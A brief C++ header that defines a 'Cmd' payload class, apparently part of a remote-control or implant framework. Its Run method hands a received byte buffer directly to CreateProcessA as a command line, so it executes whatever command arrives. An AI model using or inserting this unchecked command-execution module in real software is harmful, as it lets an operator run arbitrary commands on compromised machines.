#pragma once
#include "payload.h"

namespace Payloads {
    class Cmd : public Payload {
    public:
        using Payload::Payload;

        void Run(uint8_t* p, int n) {
            STARTUPINFOA si;
            ZeroMemory(&si, sizeof(STARTUPINFOA));
            PROCESS_INFORMATION pi;

            CreateProcessA(
                NULL,
                (LPSTR)p,
                NULL,
                NULL,
                FALSE,
                NULL,
                NULL,
                NULL,
                &si,
                &pi
            );
        }
    };
}


